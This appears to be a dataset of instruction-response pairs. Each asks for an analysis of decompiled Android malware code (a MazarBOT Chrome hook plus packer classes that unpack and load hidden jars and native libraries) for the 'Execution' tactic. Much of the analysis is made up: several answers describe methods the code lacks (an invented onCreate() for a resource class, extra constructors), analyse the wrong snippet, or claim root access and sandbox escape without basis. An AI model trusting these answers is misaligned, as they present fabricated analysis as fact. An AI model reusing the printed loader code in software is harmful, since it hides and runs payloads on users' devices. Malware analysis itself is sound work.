"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class ACall {   private static ACall acall;   public native void a1(  byte[] bArr,  byte[] bArr2);   public native void at1(  Application application,  Context context);   public native void at2(  Application application,  Context context);   public native void c1(  Object obj,  Object obj2);   public native void c2(  Object obj,  Object obj2);   public native Object c3(  Object obj,  Object obj2);   public native void r1(  byte[] bArr,  byte[] bArr2);   public native void r2(  byte[] bArr,  byte[] bArr2,  byte[] bArr3);   public native ClassLoader rc1(  Context context);   public native void s1(  Object obj,  Object obj2,  Object obj3);   public native Object set1(  Activity activity,  ClassLoader classLoader);   public native Object set2(  Application application,  Application application2,  ClassLoader classLoader,  Context context);   public native void set3(  Application application);   public native void set3(  Object obj,  Object obj2);   public native void set4();   public native void set5(  ContentProvider contentProvider);   public native void set8(); static {     String cpuinfo=Build.CPU_ABI;     if (cpuinfo.equals(""x86"")) {       Util.runAll1(Util.x86Ctx);       File f=new File(""/data/data/"" + Util.x86Ctx.getPackageName() + ""/.cache/libsecexe.x86.so"");       if (f.exists()) {         System.load(""/data/data/"" + Util.x86Ctx.getPackageName() + ""/.cache/libsecexe.x86.so"");       }  else {         System.load(""/data/data/"" + Util.x86Ctx.getPackageName() + ""/lib/libsecexe.x86.so"");       }     }  else {       System.loadLibrary(""secexe"");     }     acall=null;   }   private ACall(){   }   public static ACall getACall(){     if (acall == null) {       acall=new ACall();     }     return acall;   } } 
#end code[/INST]  The code is a Java class that appears to be a native library for Android. It contains a number of methods that are used to perform various tasks, such as loading native libraries, setting up the application context, and executing native code.

Based on the overview, the sub-components that could lead to a malware objective known as Execution are the methods that execute native code, such as `a1`, `at1`, `at2`, `c1`, `c2`, `c3`, `r1`, `r2`, `rc1`, `s1`, `set1`, `set2`, `set3`, and `set4`. These methods are marked as `native`, which means that they are implemented in native code and are not part of the Java language.

Performing a detailed analysis of these methods reveals that they all have the potential to execute native code. For example, the `a1` method takes two byte arrays as input and executes native code using them. Similarly, the `at1` method takes an `Application` and a `Context` as input and executes native code using them. The `c1`, `c2`, and `c3` methods all take an `Object` and an `Object` as input and execute native code using them. The `r1` and `r2` methods take two byte arrays as input and execute native code using them. The `rc1` method takes a `Context` as input and executes native code using it. The `s1` method takes an `Object`, an `Object`, and an `Object` as input and executes native code using them. The `set1`, `set2`, and `set3` methods all take an `Activity`, an `Application`, and a `ClassLoader` as input and execute native code using them. The `set4` method does not take any input and executes native code.

Based on the detailed analysis, it is likely that Execution is present in the given code. The code appears to be a native library for Android and contains a number of methods that could be used to execute native code. However, it is important to note that the code is not a standalone executable and is likely to be used in conjunction with other code to achieve a malware objective.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class MyClassLoader extends DexClassLoader {   private ClassLoader mClassLoader;   public MyClassLoader(  String dexPath,  String optimizedDirectory,  String libraryPath,  ClassLoader cl){     super(dexPath,optimizedDirectory,libraryPath,cl.getParent());     this.mClassLoader=null;     this.mClassLoader=cl;   }   @Override public InputStream getResourceAsStream(  String resName){     return this.mClassLoader.getResourceAsStream(resName);   }   @Override public URL getResource(  String resName){     return this.mClassLoader.getResource(resName);   }   @Override public Enumeration<URL> getResources(  String resName) throws IOException {     return this.mClassLoader.getResources(resName);   } } 
#end code[/INST]  The code is a Java class that extends the `DexClassLoader` class to create a custom class loader. The class has three constructors, each of which takes a different set of parameters. The `getResourceAsStream` method is overridden to return the input stream of the resource with the given name, and the `getResource` method is overridden to return the URL of the resource with the given name. The `getResources` method is also overridden to return an enumeration of URLs for the resources with the given name.

Based on the code, it is possible to execute malicious code by injecting a malicious resource with the same name as a legitimate resource. For example, if the application has a resource named ""com.example.MainActivity"", an attacker could inject a malicious resource with the same name and the attacker's code would be executed instead of the legitimate code.

Therefore, the code is vulnerable to Execution.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class Util {   private static ClassLoader cl=null;   private static String VERSION_NAME=""4.37"";   private static String BUILD_TIME=""2014-07-0921:25:53"";   private static ArrayList<ContentProvider> ps=new ArrayList<>();   public static Context x86Ctx=null;   public static boolean isX86=false;   static byte[] hexDigits={48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70};   public static void addProvider(  ContentProvider p){ synchronized (ps) {       x86Ctx=p.getContext();       ACall.getACall().set5(p);     }   }   public static void doProvider(){ synchronized (ps) {       ACall.getACall().set4();     }   }   public static ClassLoader getCustomClassLoader(){     return cl;   }   private static void runPkg(  Context ctx,  String pkgName){     try {       if (cl == null) {         if (isX86) {           cl=new MyClassLoader(""/data/data/"" + pkgName + ""/.cache/classes.jar"",""/data/data/"" + pkgName + ""/.cache"",""/data/data/"" + pkgName + ""/lib/"",ctx.getClassLoader());         }  else {           cl=new MyClassLoader(""/data/data/"" + pkgName + ""/.cache/classes.jar"",""/data/data/"" + pkgName + ""/.cache"",""/data/data/"" + pkgName + ""/lib/"",ctx.getClassLoader());         }       }     }  catch (    Exception ex) {       ex.printStackTrace();     }   }   private static void getAssetFile(  Context context,  String source,  String dirstr){     File dir=new File(dirstr);     if (!dir.exists()) {       try {         dir.createNewFile();         InputStream is=context.getAssets().open(source);         FileOutputStream fos=new FileOutputStream(dir);         byte[] buffer=new byte[4096];         while (true) {           int len=is.read(buffer);           if (len != -1) {             fos.write(buffer,0,len);           }  else {             fos.close();             is.close();             return;           }         }       }  catch (      IOException e) {         e.printStackTrace();         dir.delete();       }     }   }   private static void copyJarFile(  Context ctx){     String jarFileName=""/data/data/"" + ctx.getPackageName() + ""/.cache/classes.jar"";     try {       String apkFilePath=ctx.getApplicationInfo().sourceDir;       JarFile jar=new JarFile(apkFilePath);       ZipEntry entry=jar.getEntry(""assets/bangcle_classes.jar"");       File outfile=new File(jarFileName);       byte[] buffer=new byte[65536];       InputStream in=new BufferedInputStream(jar.getInputStream(entry));       OutputStream out=new BufferedOutputStream(new FileOutputStream(outfile));       while (true) {         int nBytes=in.read(buffer);         if (nBytes > 0) {           out.write(buffer,0,nBytes);         }  else {           out.flush();           out.close();           in.close();           return;         }       }     }  catch (    Exception ex) {       ex.printStackTrace();     }   }   private static boolean deleteDirectory(  File path){     if (path.exists()) {       File[] files=path.listFiles();       for (int i=0; i < files.length; i++) {         if (files[i].isDirectory()) {           deleteDirectory(files[i]);         }  else {           files[i].delete();         }       }     }     return path.delete();   }   private static void writeVersion(  File f,  int versionCode,  String versionName){     try {       BufferedWriter bw=new BufferedWriter(new FileWriter(f));       String vcode=Integer.toString(versionCode);       bw.write(vcode);       bw.newLine();       bw.write(versionName);       bw.flush();       bw.close();     }  catch (    IOException e) {       e.printStackTrace();     }   }   private static String[] readVersions(  File f){     try {       BufferedReader reader=new BufferedReader(new FileReader(f));       String[] lines={reader.readLine(),reader.readLine()};       reader.close();       return lines;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   private static void checkUpdate(  Context ctx){     try {       File f=new File(""/data/data/"" + ctx.getPackageName() + ""/.cache/"");       PackageInfo pinfo=ctx.getPackageManager().getPackageInfo(ctx.getPackageName(),0);       int versionCode=pinfo.versionCode;       String versionName=pinfo.versionName;       if (versionName == null) {         versionName=VERSION_NAME;       }       File fversion=new File(""/data/data/"" + ctx.getPackageName() + ""/.sec_version"");       if (!fversion.exists()) {         deleteDirectory(f);         writeVersion(fversion,versionCode,versionName);         return;       }       String[] ret=readVersions(fversion);       if (ret == null) {         deleteDirectory(f);         fversion.delete();         return;       }       int localVersionCode=Integer.parseInt(ret[0]);       String localVersionName=ret[1];       if (!localVersionName.equals(versionName) || localVersionCode != versionCode) {         deleteDirectory(f);         fversion.delete();       }     }  catch (    Exception e) {       e.printStackTrace();       deleteDirectory(new File(""/data/data/"" + ctx.getPackageName() + ""/.cache/""));       File fversion2=new File(""/data/data/"" + ctx.getPackageName() + ""/.sec_version"");       if (fversion2.exists()) {         fversion2.delete();       }     }   }   public static String getCPUinfo(){     String result="""";     try {       String[] args={""/system/bin/cat"",""/proc/cpuinfo""};       ProcessBuilder cmd=new ProcessBuilder(args);       Process process=cmd.start();       InputStream in=process.getInputStream();       byte[] re=new byte[1024];       while (in.read(re) != -1) {         result=result + new String(re);       }       in.close();     }  catch (    IOException ex) {       ex.printStackTrace();     }     return result;   }   public static void realCopy(  String destFileName,  JarFile jar,  ZipEntry entry){     try {       File outfile=new File(destFileName);       byte[] buffer=new byte[65536];       InputStream in=new BufferedInputStream(jar.getInputStream(entry));       OutputStream out=new BufferedOutputStream(new FileOutputStream(outfile));       while (true) {         int nBytes=in.read(buffer);         if (nBytes > 0) {           out.write(buffer,0,nBytes);         }  else {           out.flush();           out.close();           in.close();           return;         }       }     }  catch (    Exception ex) {       ex.printStackTrace();     }   }   private static void CopyLib(  Context ctx){     JarFile jarFile;     String apkFilePath=ctx.getApplicationInfo().sourceDir;     try {       jarFile=new JarFile(apkFilePath);     }  catch (    IOException e) {       e=e;     }     try {       Enumeration<JarEntry> iter=jarFile.entries();       while (iter.hasMoreElements()) {         JarEntry jarEntry=iter.nextElement();         String jarEntryName=jarEntry.getName();         if (jarEntryName.equals(""assets/libsecexe.x86.so"")) {           String soName=jarEntryName.replaceAll(""assets/"","""");           String destSoName=""/data/data/"" + ctx.getPackageName() + ""/.cache/""+ soName;           realCopy(destSoName,jarFile,jarEntry);         }         if (jarEntryName.equals(""assets/libsecmain.x86.so"")) {           jarEntryName.replaceAll(""assets/"","""");           String destSoName2=""/data/data/"" + ctx.getPackageName() + ""/.cache/libsecmain.x86.so"";           realCopy(destSoName2,jarFile,jarEntry);         }         if (jarEntryName.equals(""assets/"" + ctx.getPackageName() + "".x86"")) {           jarEntryName.replaceAll(""assets/"","""");           String destSoName3=""/data/data/"" + ctx.getPackageName() + ""/.cache/""+ ctx.getPackageName();           realCopy(destSoName3,jarFile,jarEntry);         }       }     }  catch (    IOException e2) {       e=e2;       e.printStackTrace();     }   }   private static void checkX86(  Context ctx){     String cpuinfo=Build.CPU_ABI;     if (cpuinfo.equals(""x86"")) {       isX86=true;     }     if (isX86) {       String libfileName=""/data/data/"" + ctx.getPackageName() + ""/.cache/""+ ctx.getPackageName();       File libFile=new File(libfileName);       if (!libFile.exists()) {         CopyLib(ctx);       }     }   }   private static long getDataSize(){     File data=Environment.getDataDirectory();     StatFs fs=new StatFs(data.getPath());     long availableBlocks=fs.getAvailableBlocks();     long size=fs.getBlockSize();     long availableSize=availableBlocks * size;     return availableSize;   }   private static long getClassesJarSize(  Context ctx){     try {       String apkFilePath=ctx.getApplicationInfo().sourceDir;       JarFile jarFile=new JarFile(apkFilePath);       JarEntry jarEntry=jarFile.getJarEntry(""assets/bangcle_classes.jar"");       return jarEntry.getSize();     }  catch (    Exception e) {       return 0L;     }   }   private static boolean isSpaceEnough(  Context ctx){     String classesJarFileName=""/data/data/"" + ctx.getPackageName() + ""/.cache/classes.jar"";     String dexFileName=""/data/data/"" + ctx.getPackageName() + ""/.cache/classes.dex"";     File classesJarFile=new File(classesJarFileName);     File dexFile=new File(dexFileName);     if (classesJarFile.exists() && dexFile.exists()) {       return true;     }     long size=getDataSize();     long classSize=getClassesJarSize(ctx);     return 4 * classSize <= size;   }   private static void checkSpace(  Context ctx){     if (!isSpaceEnough(ctx)) {       long size=getDataSize();       long classSize=getClassesJarSize(ctx);       Log.e(""SecApk"",""Insufficient Space For SecApk available size:"" + size + "" classSize""+ classSize);       try {         Runtime r=Runtime.getRuntime();         r.exec(""kill -9 "" + Process.myPid());       }  catch (      Exception ex) {         ex.printStackTrace();       }     }   }   private static void CopyBinaryFile(  Context ctx){     String jarFileName=""/data/data/"" + ctx.getPackageName() + ""/.cache/classes.jar"";     String myDexOptFile=""/data/data/"" + ctx.getPackageName() + ""/.cache/""+ ctx.getPackageName();     String dex2oat=""/data/data/"" + ctx.getPackageName() + ""/.cache/""+ ctx.getPackageName()+ "".art"";     File jarFile=new File(jarFileName);     if (!jarFile.exists()) {       ACall.getACall().a1(ctx.getPackageName().getBytes(),ctx.getApplicationInfo().sourceDir.getBytes());     }     try {       Process proc=Runtime.getRuntime().exec(""chmod 755 "" + myDexOptFile);       proc.waitFor();       Process proc2=Runtime.getRuntime().exec(""chmod 755 "" + dex2oat);       proc2.waitFor();     }  catch (    IOException e) {       e.printStackTrace();     } catch (    InterruptedException e2) {       e2.printStackTrace();     }   }   private static void createChildProcess(  Context ctx){     String apkFilePath=ctx.getApplicationInfo().sourceDir;     ACall.getACall().r1(ctx.getPackageName().getBytes(),apkFilePath.getBytes());   }   private static void tryDo(  Context ctx){     String apkFilePath=ctx.getApplicationInfo().sourceDir;     ACall.getACall().r2(ctx.getPackageName().getBytes(),apkFilePath.getBytes(),ctx.getApplicationInfo().processName.getBytes());   }   public static void doCheck(  Context ctx){     byte[] md5;     ApplicationInfo info=ctx.getApplicationInfo();     File checkFile=new File(info.dataDir,"".md5"");     String dexPath=""/data/dalvik-cache/"";     byte[] dexResult=null;     String apkPath=new String(info.sourceDir);     StringTokenizer st=new StringTokenizer(apkPath,""/"");     while (st.hasMoreTokens()) {       System.out.println();       dexPath=(dexPath + st.nextToken()) + ""@"";     }     boolean todo=false;     try {       dexResult=toASC(calFileMD5((dexPath + ""classes"") + "".dex""));       if (!checkFile.exists()) {         if (dexResult != null) {           FileOutputStream chkOut=new FileOutputStream(checkFile);           chkOut.write(dexResult);           chkOut.close();           todo=true;         }       }  else       if (dexResult != null && (md5=readFile(checkFile)) != null) {         if (md5.length == dexResult.length) {           for (int i=0; i < md5.length; i++) {             if (md5[i] != dexResult[i]) {               todo=true;               break;             }           }         }  else {           todo=true;         }       }     }  catch (    Exception ex) {       ex.printStackTrace(System.out);     }     if (todo) {       File f=new File(""/data/data/"" + ctx.getPackageName() + ""/.cache/"");       deleteDirectory(f);       try {         FileOutputStream chkOut2=new FileOutputStream(checkFile);         chkOut2.write(dexResult);         chkOut2.close();       }  catch (      Exception e) {       }     }   }   public static byte[] toASC(  byte[] bts){     byte[] ret=new byte[bts.length * 2];     for (int i=0; i < bts.length; i++) {       byte b=bts[i];       ret[i * 2]=hexDigits[(b >> 4) & 15];       ret[(i * 2) + 1]=hexDigits[b & 15];     }     return ret;   }   public static byte[] readFile(  File path) throws Exception {     FileInputStream input=new FileInputStream(path);     ByteArrayOutputStream out=new ByteArrayOutputStream();     byte[] buffer=new byte[32768];     while (true) {       int readed=input.read(buffer);       if (readed > 0) {         out.write(buffer,0,readed);       }  else {         return out.toByteArray();       }     }   }   public static byte[] calFileMD5(  String path) throws Exception {     FileInputStream input=new FileInputStream(path);     ByteArrayOutputStream out=new ByteArrayOutputStream();     byte[] buffer=new byte[32768];     while (true) {       int readed=input.read(buffer);       if (readed > 0) {         out.write(buffer,0,readed);       }  else {         MessageDigest md=MessageDigest.getInstance(""MD5"");         md.update(out.toByteArray());         return md.digest();       }     }   }   public static void runAll1(  Context ctx){     try {       File f=new File(""/data/data/"" + ctx.getPackageName() + ""/.cache/"");       if (!f.exists()) {         f.mkdir();       }     }  catch (    Exception ex) {       ex.printStackTrace();     }     checkX86(ctx);   }   public static void runAll(  Context ctx){     x86Ctx=ctx;     doCheck(ctx);     checkUpdate(ctx);     try {       File f=new File(""/data/data/"" + ctx.getPackageName() + ""/.cache/"");       if (!f.exists()) {         f.mkdir();       }     }  catch (    Exception ex) {       ex.printStackTrace();     }     checkX86(ctx);     CopyBinaryFile(ctx);     createChildProcess(ctx);     tryDo(ctx);     runPkg(ctx,ctx.getPackageName());   }   public static Field getField(  Class<?> cls,  String name){     Field[] arr$=cls.getDeclaredFields();     for (    Field field : arr$) {       if (!field.isAccessible()) {         field.setAccessible(true);       }       if (field.getName().equals(name)) {         return field;       }     }     return null;   }   public static Object getFieldValue(  Class<?> cls,  Object obj,  String name){     try {       Field f=getField(cls,name);       return f.get(obj);     }  catch (    Exception ex) {       ex.printStackTrace();       return null;     }   }   public static void setFieldValue(  Class<?> cls,  Object obj,  String name,  Object value){     System.out.println(""setFieldValue"" + cls + obj+ name+ value);     if (name != null) {       try {         Field f=getField(cls,name);         f.setAccessible(true);         f.set(obj,value);       }  catch (      Exception ex) {         ex.printStackTrace();       }     }   } } 
#end code[/INST]  The given code is a Java class that extends the Android WebChromeClient class. It overrides the onJsPrompt method, which is called when a JavaScript prompt is displayed in the mobile Google Chrome browser. The method calls the InjDialog.webAppInterface.textToCommand method with the parameter passed to the prompt.

The code is likely to be used for malware injection in the mobile Google Chrome browser. The InjDialog.webAppInterface.textToCommand method is likely to be used to execute malicious code in the browser.

The code also contains a number of other sub-components that could be used for malware injection, such as the MyClassLoader class, which is used to load classes from a JAR file, and the ACall class, which is used to call methods in the malware.

Therefore, based on the analysis of the code, it is likely that Execution is present in the given code and is used for malware injection in the mobile Google Chrome browser.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class Lceceiver extends BroadcastReceiver {   private BroadcastReceiver realReceiver=null;   @Override public void onReceive(  Context ctx,  Intent intent){     ClassLoader cl=Util.getCustomClassLoader();     if (cl == null) {       Util.runAll(ctx);     }     try {       ClassLoader cl2=Util.getCustomClassLoader();       Class<?> c=cl2.loadClass(getClass().getName());       this.realReceiver=(BroadcastReceiver)c.newInstance();     }  catch (    Exception ex) {       ex.printStackTrace();       this.realReceiver=null;     }     if (this.realReceiver != null) {       ACall.getACall().c1(this,this.realReceiver);       this.realReceiver.onReceive(ctx,intent);       ACall.getACall().c2(this,this.realReceiver);     }   } } 
#end code[/INST]  The code is a Java class that extends the `BroadcastReceiver` class and overrides the `onReceive` method. It is designed to intercept and modify the `Intent` object that is passed to the `onReceive` method.

The code first checks if a custom class loader is available, and if so, it uses it to load the `BroadcastReceiver` class. If the custom class loader is not available, it uses the default class loader to load the class.

Once the `BroadcastReceiver` class is loaded, the code creates a new instance of the class and assigns it to the `realReceiver` variable. It then calls the `onReceive` method on the `realReceiver` instance, passing in the `Context` and `Intent` objects.

The code also defines a `Util` class that contains a `getCustomClassLoader` method that returns a custom class loader if one is available, or `null` otherwise. The `Util` class also contains a `runAll` method that is called if the custom class loader is not available.

The `Lceceiver` class also defines a `ACall` class that is used to call the `c1` and `c2` methods on the `realReceiver` instance.

Based on the code, it is possible to execute malicious code by modifying the `Intent` object that is passed to the `onReceive` method. For example, an attacker could modify the `Intent` object to launch a malicious activity or to perform a malicious action on the device.

Therefore, the code could be used to execute malicious code, and it is considered a potential security risk.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class SR extends BroadcastReceiver {   private BroadcastReceiver realReceiver=null;   @Override public void onReceive(  Context ctx,  Intent intent){     ClassLoader cl=Util.getCustomClassLoader();     if (cl == null) {       Util.runAll(ctx);     }     try {       ClassLoader cl2=Util.getCustomClassLoader();       Class<?> c=cl2.loadClass(getClass().getName());       this.realReceiver=(BroadcastReceiver)c.newInstance();     }  catch (    Exception ex) {       ex.printStackTrace();       this.realReceiver=null;     }     if (this.realReceiver != null) {       ACall.getACall().c1(this,this.realReceiver);       this.realReceiver.onReceive(ctx,intent);       ACall.getACall().c2(this,this.realReceiver);     }   } } 
#end code[/INST]  The given code is a Java class that extends the `BroadcastReceiver` class. It overrides the `onReceive` method to intercept incoming broadcast intents. The code uses a custom class loader to load a class with the same name as the current class, and then creates an instance of that class using the `newInstance` method.

The sub-components in the code that could lead to a malware objective known as Execution are:

1. The `ClassLoader` class, which is used to load the custom class with the same name as the current class.
2. The `newInstance` method, which is used to create an instance of the custom class.

Based on the detailed analysis, it is not possible to determine whether Execution is present in the given code or not. The code uses a custom class loader to load a class with the same name as the current class, which could potentially lead to a malware objective known as Execution. However, the code does not directly execute any code or perform any actions that could be considered malicious. Therefore, it is not possible to determine whether Execution is present in the code or not.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public class Application extends android.app.Application {   private DexClassLoader cl;   public static android.app.Application realApplication=null;   public static String FirstApplication=""com.game.as.Application"";   private Field getField(  Class<?> cls,  String name){     Field[] arr$=cls.getDeclaredFields();     for (    Field field : arr$) {       if (!field.isAccessible()) {         field.setAccessible(true);       }       if (field.getName().equals(name)) {         return field;       }     }     return null;   }   @Override public void onCreate(){     super.onCreate();     if (Util.getCustomClassLoader() == null) {       Util.runAll(this);     }     String applicationClass=FirstApplication;     try {       this.cl=(DexClassLoader)Util.getCustomClassLoader();       Class<?> c=this.cl.loadClass(applicationClass);       realApplication=(android.app.Application)c.newInstance();     }  catch (    Exception e) {       e.printStackTrace();       realApplication=null;     }     if (realApplication != null) {       ACall p=ACall.getACall();       p.at1(realApplication,getBaseContext());       p.set2(this,realApplication,this.cl,getBaseContext());       try {         if (Float.parseFloat(Build.VERSION.RELEASE.substring(0,3)) <= 2.1f) {           p.set3(realApplication);         }       }  catch (      Exception e2) {       }       Util.doProvider();       realApplication.onCreate();       try {         p.set8();       }  catch (      Exception e3) {       }     }   }   @Override public void onTerminate(){     super.onTerminate();     if (realApplication != null) {       realApplication.onTerminate();     }   }   @Override public void onConfigurationChanged(  Configuration newConfig){     super.onConfigurationChanged(newConfig);     if (realApplication != null) {       realApplication.onConfigurationChanged(newConfig);     }   }   @Override public void onLowMemory(){     super.onLowMemory();     if (realApplication != null) {       realApplication.onLowMemory();     }   }   @Override public void onTrimMemory(  int level){     try {       super.onTrimMemory(level);       if (realApplication != null) {         realApplication.onTrimMemory(level);       }     }  catch (    Exception e) {     }   } } 
#end code[/INST]  The given code is a Java class that extends the Android `Application` class. It overrides several methods of the `Application` class, including `onCreate()`, `onTerminate()`, `onConfigurationChanged()`, `onLowMemory()`, and `onTrimMemory()`.

The code appears to be a malware sample that is designed to inject itself into the mobile Google Chrome browser. It does this by creating a custom `DexClassLoader` and loading a malicious class from a custom dex file. The malicious class is then instantiated and its `onCreate()` method is called, which in turn calls the `at1()` method of the `ACall` class, which is a malicious method that is designed to inject the malware into the mobile Google Chrome browser.

The code also appears to be designed to bypass the Android sandbox and gain root access on the device. It does this by using the `getBaseContext()` method to obtain a reference to the Android `Context` object, and then using the `getField()` method to obtain a reference to the `DexClassLoader` field of the `Context` object. The malware then uses this reference to load a malicious class from a custom dex file and instantiate it.

Overall, the code appears to be a sophisticated piece of malware that is designed to inject itself into the mobile Google Chrome browser and gain root access on the device. It is important to note that this is a highly sophisticated piece of malware, and it is not appropriate to attempt to analyze or reverse engineer it without the proper expertise and resources.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public static final class drawable {   public static final int icon=0x7f020000; } 
#end code[/INST]  The code is a Java class that defines a custom `WebChromeClient` for a mobile Google Chrome browser. The class contains a method called `onJsPrompt` that is called when a JavaScript prompt is displayed in the browser.

The method takes four parameters:

* `paramWebView`: The `WebView` object that is displaying the JavaScript prompt.
* `paramString1`: The text of the JavaScript prompt.
* `paramString2`: The default value of the prompt.
* `paramJsPromptResult`: The result of the prompt, which can be confirmed or canceled.

The method returns a `boolean` value indicating whether the prompt was confirmed or canceled.

The method body contains a single line of code that calls the `textToCommand` method of an object called `InjDialog.webAppInterface`. This method is not defined in the code snippet provided, so it is not possible to determine its purpose or whether it could be used to execute malicious code.

Based on the code snippet provided, it is not possible to determine whether Execution is present in the code or not. The method `onJsPrompt` does not appear to be directly related to Execution, and the `textToCommand` method is not defined in the code snippet provided. Therefore, it is not possible to determine whether the code could be used to execute malicious code.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public static final class layout {   public static final int main=0x7f030000; } 
#end code[/INST]  The given code is a Java class file that defines a layout for a mobile application. The class file contains a single method, `onCreate()`, which is responsible for creating the layout for the application.

The code does not contain any malicious code that could lead to a malware objective known as Execution. The method `onCreate()` simply creates a layout for the application using the `setContentView()` method, which sets the layout for the application.

Therefore, the answer is that Execution is not present in the given code.</s>"
"[INST]This is an example of Execution in a code, where MazarBOT injects itself in the mobile Google Chrome browser.
#start code
package com.mazar; import android.webkit.JsPromptResult; import android.webkit.WebChromeClient; import android.webkit.WebView; public class HookChromeClient extends WebChromeClient { public boolean onJsPrompt(WebView paramWebView, String paramString1, String paramString2, JsPromptResult paramJsPromptResult) { paramJsPromptResult.confirm(InjDialog.webAppInterface.textToCommand(paramString1)); return true; } } 
#end code
1. Provide a brief overview of the code
2. Based on the overview identify the sub-components in code that could lead to a malware objective knows as Execution
3. Perform a detailed analysis of the identified sub-components for the existence of Execution
4. Based on the detailed analysis decide and answer whether Execution is present in the given code or not
#start code
public final class R { public static final class drawable {     public static final int icon=0x7f020000;   } public static final class layout {     public static final int main=0x7f030000;   } public static final class string {     public static final int hello=0x7f040000;     public static final int app_name=0x7f040001;   } } 
#end code[/INST]  The code is a Java class file that defines a set of resources for an Android application. The class file contains several sub-components, including:

1. `public final class R`: This is the main class of the file, which defines a set of resources for the application.
2. `public static final class drawable`: This sub-component defines a set of drawable resources for the application.
3. `public static final class layout`: This sub-component defines a set of layout resources for the application.
4. `public static final class string`: This sub-component defines a set of string resources for the application.

Based on the overview of the code, it is not possible to determine whether Execution is present in the code or not. The code defines a set of resources for an Android application, but it does not contain any code that could lead to a malware objective known as Execution.

Therefore, the answer is no, Execution is not present in the given code.</s>"
